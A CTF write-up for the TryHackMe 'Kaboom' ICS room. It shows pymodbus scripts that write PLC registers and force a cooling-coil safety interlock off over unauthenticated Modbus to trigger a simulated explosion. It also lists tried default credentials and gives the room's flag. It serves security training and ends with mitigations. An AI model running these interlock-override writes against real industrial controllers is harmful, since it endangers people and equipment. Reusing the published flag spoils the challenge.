@@ -1,0 +1,256 @@
+# [Kaboom](https://tryhackme.com/room/kaboom) - TryHackMe CTF Writeup
+### TryHackMe · ICS/OT Security · Kaboom
+
+> **Author:** [George Giannakidis](https://github.com/georgegiannakidis)  
+> **Platform:** TryHackMe  
+> **Room:** [Kaboom](https://tryhackme.com/room/kaboom)  
+> **Category:** ICS / OT · SCADA · Modbus  
+> **Difficulty:** Medium  
+> **Flag:** `THM{BOOM_BOOM_KABOOM}`  
+> **AI vs AI:** Industrial control system breach — defeat a PLC safety interlock over unauthenticated Modbus TCP to trigger a simulated explosion and reveal the flag.
+
+---
+
+## Table of Contents
+
+1. [Reconnaissance](#1-reconnaissance)
+2. [Surface Analysis](#2-surface-analysis)
+   - [The CCTV Simulator (Port 80)](#21-the-cctv-simulator-port-80)
+   - [Red Herrings](#22-red-herrings)
+3. [Exploitation](#3-exploitation)
+   - [Enumerating Modbus](#31-enumerating-modbus)
+   - [Maxing the Temperature](#32-maxing-the-temperature)
+   - [Defeating the Safety Interlock](#33-defeating-the-safety-interlock)
+4. [Flag Extraction](#4-flag-extraction)
+5. [Conclusion](#5-conclusion)
+
+---
+
+## 1. Reconnaissance
+
+**Severity:** Informational  
+**Location:** Target host, full TCP scan
+
+An initial `nmap` scan reveals a textbook ICS/OT stack.
+
+#### Code Blocks
+
+```bash
+nmap -sV -p- <TARGET_IP>
+```
+
+#### Tables
+
+| Port  | Service        | Notes                                          |
+|-------|----------------|------------------------------------------------|
+| 80    | HTTP           | "PLC CCTV Simulator" — live video feed         |
+| 102   | Siemens S7     | SNAP7 PLC simulation                           |
+| 502   | **Modbus TCP** | **Unauthenticated — the real attack surface**  |
+| 1880  | Node-RED       | Editor reachable (red herring)                 |
+| 8080  | OpenPLC        | Web login portal (red herring)                 |
+| 44818 | EtherNet/IP    | ICS discovery protocol                         |
+
+---
+
+## 2. Surface Analysis
+
+### 2.1. The CCTV Simulator (Port 80)
+
+**Severity:** Informational  
+**Location:** `http://<TARGET_IP>/`
+
+The web page is a "PLC CCTV Simulator" that polls a backend for state and swaps the
+displayed video based on the PLC's physical condition.
+
+#### Code Blocks
+
+```js
+async function getPLCVideo() {
+  const res = await fetch('/api/state');
+  return await res.json();
+}
+// video src = `/video?mode=${video}`
+```
+
+Querying the state endpoint directly:
+
+```bash
+curl -s http://<TARGET_IP>/api/state
+```
+
+```json
+{ "status": "Normal", "video": "default" }
+```
+
+The web UI is **only a viewer** for the PLC state. To change what it displays, we
+must change the PLC itself — over Modbus.
+
+### 2.2. Red Herrings
+
+**Severity:** Note  
+**Location:** Ports 1880, 8080
+
+> *"The shiny services are the trap. The simplest unauthenticated protocol is the door."*
+> *- ICS pentest wisdom*
+
+| Service          | Tested                                              | Result    |
+|------------------|-----------------------------------------------------|-----------|
+| OpenPLC (8080)   | Default creds `openplc:openplc`, `admin:admin`, etc.| All failed |
+| Node-RED (1880)  | `/flows` API, `/auth/token` with `admin:password`   | Auth blocked |
+
+Neither is the intended path. Move on to Modbus.
+
+---
+
+## 3. Exploitation
+
+### 3.1. Enumerating Modbus
+
+**Severity:** Critical  
+**Location:** `<TARGET_IP>:502`
+
+Modbus TCP has **no authentication** by design. Using `pymodbus`:
+
+```bash
+pip install pymodbus
+```
+
+```python
+from pymodbus.client import ModbusTcpClient
+
+c = ModbusTcpClient('<TARGET_IP>', port=502)
+c.connect()
+
+print("HOLDING:", c.read_holding_registers(0, count=10).registers)
+print("COILS:",   c.read_coils(0, count=20).bits)
+c.close()
+```
+
+**Findings:**
+
+| Object                | Observation                          | Meaning              |
+|-----------------------|--------------------------------------|----------------------|
+| Holding register 0    | Fluctuates around `56`               | **Temperature**      |
+| Coils                 | All `False` initially                | Control bits idle    |
+
+### 3.2. Maxing the Temperature
+
+**Severity:** High  
+**Location:** Holding register 0
+
+Write the temperature register to its maximum value:
+
+```python
+c.write_register(0, 65535)   # max out temperature
+```
+
+Re-check the web state:
+
+```json
+{ "status": "High Temperature, Cooling ON", "video": "cooling" }
+```
+
+The PLC reacts — but a **safety interlock engages**. Re-reading shows the
+temperature *dropping* (`65535 → 65487 → ...`) and a new coil flips on:
+
+```python
+COILS: [..., index 15 = True, ...]   # COIL 15 = Cooling System
+```
+
+The cooling system (coil 15) automatically pulls the temperature back down. A
+single write is not enough — the PLC keeps saving itself.
+
+### 3.3. Defeating the Safety Interlock
+
+**Severity:** Critical  
+**Location:** Holding register 0 + Coil 15
+
+To force an explosion, **hold the temperature maxed while forcing the cooling coil
+OFF** — faster than the PLC scan cycle can re-engage it.
+
+```python
+from pymodbus.client import ModbusTcpClient
+import time, urllib.request
+
+c = ModbusTcpClient('<TARGET_IP>', port=502)
+c.connect()
+
+for _ in range(5):
+    c.write_register(0, 65535)   # pin temperature at max
+    c.write_coil(15, False)      # force cooling OFF
+    time.sleep(0.5)
+
+print("HOLD[0]:", c.read_holding_registers(0, count=1).registers)
+print("COIL15:",  c.read_coils(15, count=1).bits[0])
+c.close()
+
+state = urllib.request.urlopen("http://<TARGET_IP>/api/state").read().decode()
+print("STATE:", state)
+```
+
+Output:
+
+```text
+HOLD[0]: [3000]
+COIL15: False
+STATE: {
+  "status": "Explosion Detected!",
+  "video": "explodedflag23"
+}
+```
+
+The safety lost the race — **`Explosion Detected!`** and a new video mode appears:
+`explodedflag23`.
+
+---
+
+## 4. Flag Extraction
+
+**Severity:** High  
+**Location:** `/video?mode=explodedflag23`
+
+The explosion video name hints the flag is inside. Download it and extract frames —
+the flag is **rendered on-screen**, not in metadata.
+
+```bash
+curl -s "http://<TARGET_IP>/video?mode=explodedflag23" -o flag.mp4
+
+# strings yields nothing — flag is drawn in the frames
+ffmpeg -i flag.mp4 -vf fps=2 f_%03d.png
+xdg-open f_001.png
+```
+
+The opening frames of the explosion clip show the flag overlaid on the fireball:
+
+```
+THM{BOOM_BOOM_KABOOM}
+```
+
+---
+
+## 5. Conclusion
+
+| Label            | Detail                                                                 |
+|------------------|------------------------------------------------------------------------|
+| **Vector**       | Unauthenticated Modbus TCP (port 502)                                   |
+| **Root Cause**   | No auth on Modbus + safety interlock controllable by attacker          |
+| **Technique**    | Register/coil manipulation; race the PLC scan cycle to defeat cooling  |
+| **Impact**       | Full override of physical process safety → simulated explosion         |
+| **Flag**         | `THM{BOOM_BOOM_KABOOM}`                                                 |
+
+**Key takeaways:**
+
+- ICS/OT attacks target **process logic, not credentials** — no login was ever needed.
+- **Modbus is unauthenticated by design**; network reach equals read/write control.
+- **Safety interlocks are just coils** — if writable, the safety becomes attacker-controlled.
+- **Don't chase shiny services** — OpenPLC and Node-RED were deliberate distractions.
+- **Real-world mitigation:** segment OT networks, never expose Modbus/S7/EtherNet-IP to
+  untrusted networks, enforce read-only / authenticated gateways.
+
+**Tools used:** `nmap` · `pymodbus` · `curl` · `ffmpeg`
+
+---
+
+*Written by [George Giannakidis](https://github.com/georgegiannakidis) · 2026-06-27*  
+*TryHackMe · ICS/OT Security · Kaboom*  
+*Flag: `THM{BOOM_BOOM_KABOOM}`*
